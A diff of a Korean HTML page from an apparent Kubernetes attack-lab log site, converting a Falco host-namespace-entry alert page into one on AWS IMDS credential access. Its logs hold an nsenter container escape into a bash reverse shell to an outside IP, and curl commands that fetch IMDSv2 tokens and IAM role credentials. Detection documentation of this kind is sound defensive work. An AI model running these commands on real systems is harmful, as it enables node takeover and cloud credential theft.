@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>SB-04 FL-004 Falco Host Namespace Entry Log | Spacebar Campaign Logs</title>
+  <title>SB-04 FL-005 Falco IMDS Credential Access | Spacebar Campaign Logs</title>
   <link rel="stylesheet" href="/assets/campaign.css">
 </head>
 <body>
@@ -26,8 +26,8 @@
           <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-002/"><span>FL-002</span>Falco RBAC Check Log</a>
           <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-003/"><span>FL-003</span>Falco Copy Fail Log</a>
           <a class="sidebar-link" href="/campaigns/SB-04/logs/KL-001/"><span>KL-001</span>Kyverno Suspicious Pod Creation Log</a>
-          <a class="sidebar-link active" href="/campaigns/SB-04/logs/FL-004/"><span>FL-004</span>Falco Host Namespace Entry Log</a>
-          <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-005/"><span>FL-005</span>Falco IMDS Credential Access</a>
+          <a class="sidebar-link" href="/campaigns/SB-04/logs/FL-004/"><span>FL-004</span>Falco Host Namespace Entry Log</a>
+          <a class="sidebar-link active" href="/campaigns/SB-04/logs/FL-005/"><span>FL-005</span>Falco IMDS Credential Access</a>
         </nav>
       </div>
       <div class="sidebar-block">
@@ -38,11 +38,11 @@
       </div>
     </aside>
     <main class="page campaign-content">
-      <div class="breadcrumbs"><a href="/campaigns/">Home</a> / <a href="/campaigns/SB-04/">NodeFall</a> / <a href="/campaigns/SB-04/logs/">Campaign Logs</a> / <span>FL-004</span></div>
-<h1>FL-004 Falco Host Namespace Entry Log</h1>
+      <div class="breadcrumbs"><a href="/campaigns/">Home</a> / <a href="/campaigns/SB-04/">NodeFall</a> / <a href="/campaigns/SB-04/logs/">Campaign Logs</a> / <span>FL-005</span></div>
+<h1>FL-005 Falco IMDS Credential Access</h1>
 <div class="meta-grid" aria-label="Campaign metadata">
 <div class="meta-label">Log ID:</div>
-<div class="meta-value">FL-004</div>
+<div class="meta-value">FL-005</div>
 <div class="meta-label">Source:</div>
 <div class="meta-value">SB-04 K8s Node</div>
 <div class="meta-label">Representative Path:</div>
@@ -50,20 +50,21 @@
 <div class="meta-label">Collection:</div>
 <div class="meta-value">Wazuh agent journald input (<code>/var/ossec/etc/ossec.conf</code>)</div>
 <div class="meta-label">Primary Use:</div>
-<div class="meta-value">컨테이너 내부 프로세스의 host namespace 진입 행위 확인</div>
+<div class="meta-value">IMDS 접근을 통한 EC2 Instance Profile 임시 자격증명 획득 행위 확인</div>
 </div>
 <h2 id="공격-행위-요약">공격 행위 요약</h2>
-<p>FL-004는 NodeFall 캠페인에서 공격자가 위험 Pod 실행 환경을 이용해 컨테이너 경계를 넘어 호스트 네임스페이스에 진입한 런타임 행위를 설명하는 Falco 기반 로그이다.</p>
-<p>공격자는 <code>privileged</code>, <code>hostPID</code>, <code>hostNetwork</code> 등 호스트 접근이 가능한 Pod 실행 환경을 만든 뒤, 컨테이너 내부에서 <code>nsenter</code>를 실행하거나 <code>setns</code> syscall을 호출하여 호스트의 namespace로 진입했다. 이 행위는 단순히 위험 Pod를 생성한 것이 아니라, 실제로 컨테이너 격리 경계를 넘어 호스트 영역에 접근하려는 실행 단계에 해당한다.</p>
-<p>Falco는 eBPF/driver를 통해 Linux Kernel syscall을 관찰한다. 컨테이너 내부 프로세스에서 <code>setns</code> syscall이 발생하거나, <code>nsenter</code> 프로세스 실행이 확인되면 Falco rule <code>FL-004 Host Namespace Entry</code>가 매칭되고 <code>[FL-004] Host Namespace Entry</code> 로그가 생성된다.</p>
-<p>FL-004는 Kyverno 기반 <code>KL-001</code>이 설명하는 위험 Pod 생성 요청 이후, 실제 host namespace entry가 발생했는지 확인하는 런타임 증거로 사용된다.</p>
+<p>FL-005는 NodeFall 캠페인에서 공격자가 탈취한 노드 또는 컨테이너 실행 환경에서 AWS EC2 Instance Metadata Service(IMDS)에 접근하여 Instance Profile 임시 자격증명을 획득하려는 런타임 행위를 설명하는 Falco 기반 로그이다.</p>
+<p>공격자는 <code>169.254.169.254</code> 메타데이터 엔드포인트에 접근하여 IMDSv2 토큰을 발급받고, <code>/latest/meta-data/iam/security-credentials/</code> 경로를 조회하여 EC2 인스턴스에 연결된 IAM Role 이름과 임시 자격증명을 확인했다. 이 자격증명은 이후 STS, Secrets Manager, RDS 등 AWS API 호출에 사용될 수 있다.</p>
+<p>Falco는 eBPF/driver를 통해 Linux syscall 및 프로세스 실행 정보를 관찰한다. 프로세스 커맨드라인에 IMDS 주소 또는 메타데이터 자격증명 경로가 포함되거나, <code>169.254.169.254</code>로 네트워크 연결이 발생하면 Falco rule <code>FL-005 IMDS Credential Access</code>가 매칭되고 <code>[FL-005] IMDS Credential Access</code> 로그가 생성된다.</p>
+<p>FL-005는 CloudTrail의 <code>GetCallerIdentity</code>, <code>ListSecrets</code>, <code>GetSecretValue</code>, <code>DescribeDBInstances</code> 이벤트 이전 단계에서, AWS API 호출에 사용될 수 있는 임시 자격증명을 런타임에서 획득하려 한 증거로 사용된다.</p>
 <h2 id="로그-발생-위치">로그 발생 위치</h2>
 <div class="table-wrap wide-table">
 <table>
 <thead><tr><th>구분</th><th>위치</th><th>설명</th></tr></thead>
 <tbody>
-<tr><td>K8s Node</td><td>Linux Kernel syscall</td><td>컨테이너 내부에서 <code>nsenter</code> 실행 또는 <code>setns</code> syscall이 발생</td></tr>
-<tr><td>Falco</td><td>rule <code>FL-004 Host Namespace Entry</code></td><td>syscall 이벤트가 Falco rule 조건과 매칭되면 탐지 이벤트 생성</td></tr>
+<tr><td>K8s Node</td><td>Linux syscall / process execution</td><td>IMDS 접근 명령 실행 또는 메타데이터 IP로 네트워크 연결 발생</td></tr>
+<tr><td>AWS IMDS</td><td><code>169.254.169.254</code></td><td>EC2 Instance Metadata Service 엔드포인트</td></tr>
+<tr><td>Falco</td><td>rule <code>FL-005 IMDS Credential Access</code></td><td>IMDS 접근 행위가 조건과 매칭되면 탐지 이벤트 생성</td></tr>
 <tr><td>K8s Node</td><td><code>falco-modern-bpf.service</code></td><td>Falco가 생성한 탐지 이벤트가 systemd service 로그로 기록</td></tr>
 <tr><td>K8s Node</td><td><code>journalctl -u falco-modern-bpf.service</code></td><td>분석자가 Falco 원본 탐지 로그를 확인하는 대표 위치</td></tr>
 </tbody></table></div>
@@ -72,21 +73,23 @@
 <table>
 <thead><tr><th>구분</th><th>방식</th></tr></thead>
 <tbody>
-<tr><td>Falco 탐지 기준</td><td>컨테이너 내부에서 <code>evt.type = setns</code>가 발생하거나, <code>execve/execveat</code>로 <code>nsenter</code> 프로세스가 실행되는지 확인</td></tr>
-<tr><td>Falco 탐지 메시지</td><td>조건 매칭 시 Falco <code>output</code> 값인 <code>[FL-004] Host Namespace Entry</code>가 journald 로그에 기록됨</td></tr>
-<tr><td>Linux syscall</td><td><code>setns</code>, <code>execve</code>, <code>execveat</code> 이벤트가 eBPF/driver를 통해 Falco에 전달됨</td></tr>
+<tr><td>Falco 탐지 기준</td><td>프로세스 커맨드라인에 <code>169.254.169.254</code>, <code>/latest/api/token</code>, <code>/latest/meta-data/iam/security-credentials</code>가 포함되는지 확인</td></tr>
+<tr><td>Falco 탐지 기준</td><td>프로세스가 IMDS IP(<code>169.254.169.254</code>)로 네트워크 연결을 시도하는지 확인</td></tr>
+<tr><td>Falco 탐지 메시지</td><td>조건 매칭 시 Falco <code>output</code> 값인 <code>[FL-005] IMDS Credential Access</code>가 journald 로그에 기록됨</td></tr>
+<tr><td>Linux syscall</td><td><code>execve</code>, <code>execveat</code>, <code>connect</code>, <code>sendto</code>, <code>sendmsg</code> 이벤트가 eBPF/driver를 통해 Falco에 전달됨</td></tr>
 <tr><td>journald</td><td>Falco 탐지 이벤트가 <code>falco-modern-bpf.service</code>의 systemd journal에 저장됨</td></tr>
 <tr><td>Wazuh agent</td><td>K8s node의 <code>/var/ossec/etc/ossec.conf</code>에서 journald 로그를 수집</td></tr>
-<tr><td>Wazuh manager</td><td>수집된 Falco 로그를 <code>local_rules.xml</code>의 <code>FL-004</code> 룰과 매칭</td></tr>
-<tr><td>Wazuh Dashboard</td><td>매칭된 alert를 <code>[FL-004] Host Namespace Entry</code> 이벤트로 표시</td></tr>
+<tr><td>Wazuh manager</td><td>수집된 Falco 로그를 <code>nodefall_falco_rules.xml</code>의 <code>FL-005</code> 룰과 매칭</td></tr>
+<tr><td>Wazuh Dashboard</td><td>매칭된 alert를 <code>[FL-005] IMDS Credential Access</code> 이벤트로 표시</td></tr>
 </tbody></table></div>
 <h2 id="로그-출력-명령어">로그 출력 명령어</h2>
-<pre><code>sudo journalctl -u falco-modern-bpf.service --no-pager | grep -E &quot;\[FL-004\] Host Namespace Entry&quot;</code></pre>
+<pre><code>sudo journalctl -u falco-modern-bpf.service --no-pager | grep -E &quot;\[FL-005\]</code></pre>
 <h2 id="실제-관측-로그">실제 관측 로그</h2>
-<pre><code>May 23 22:52:43 ip-10-0-133-48 falco[16715]: 22:52:43.544568206: Critical [FL-004] Host Namespace Entry
-(user=root proc=nsenter -t 1 -m -u -i -n -p -- bash -c bash -i &gt;&amp; /dev/tcp/43.203.119.227/9003 0&gt;&amp;1 container=pwned pod=pwned-pod-final ns=kube-system)
-container_id=f3a18f7ee9a8 container_name=pwned container_image_repository=docker.io/library/node container_image_tag=20 k8s_pod_name=pwned-pod-final k8s_ns_name=kube-system</code></pre>
+<pre><code>May 27 02:15:48 ip-10-0-133-48 falco[28369]: 02:15:48.482415537: Warning [FL-005] IMDS Credential Access (technique=T1552.005 cmd=&quot;curl -s -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds: 21600&quot; parent_cmd=&quot;bash -i&quot; user=root pod=pwned-pod-final ns=kube-system container_id=f8b62c77cf58 dst=&lt;NA&gt;:&lt;NA&gt;) container_id=f8b62c77cf58 container_name=pwned container_image_repository=docker.io/library/node container_image_tag=20 k8s_pod_name=pwned-pod-final k8s_ns_name=kube-system</code></pre>
+<pre><code>May 27 02:15:56 ip-10-0-133-48 falco[28369]: 02:15:56.366299003: Warning [FL-005] IMDS Credential Access (technique=T1552.005 cmd=&quot;curl -s -H X-aws-ec2-metadata-token: AQAEAP7LAethDQ9zByQBHqydzdrK9byyq2VF8Pqij5yK9iV0BygILA== http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot; parent_cmd=&quot;bash -i&quot; user=root pod=pwned-pod-final ns=kube-system container_id=f8b62c77cf58 dst=&lt;NA&gt;:&lt;NA&gt;) container_id=f8b62c77cf58 container_name=pwned container_image_repository=docker.io/library/node container_image_tag=20 k8s_pod_name=pwned-pod-final k8s_ns_name=kube-system</code></pre>
+<pre><code>May 27 02:16:03 ip-10-0-133-48 falco[28369]: 02:16:03.822634472: Warning [FL-005] IMDS Credential Access (technique=T1552.005 cmd=&quot;curl -s -H X-aws-ec2-metadata-token: AQAEAP7LAethDQ9zByQBHqydzdrK9byyq2VF8Pqij5yK9iV0BygILA== http://169.254.169.254/latest/meta-data/iam/security-credentials/vuln-eks-node-role&quot; parent_cmd=&quot;bash -i&quot; user=root pod=pwned-pod-final ns=kube-system container_id=f8b62c77cf58 dst=&lt;NA&gt;:&lt;NA&gt;) container_id=f8b62c77cf58 container_name=pwned container_image_repository=docker.io/library/node container_image_tag=20 k8s_pod_name=pwned-pod-final k8s_ns_name=kube-system</code></pre>
 <h2 id="주요-필드">주요 필드</h2>
+<p>수정시작부분</p>
 <div class="table-wrap wide-table">
 <table>
 <thead><tr><th>필드</th><th>의미</th><th>예시</th></tr></thead>
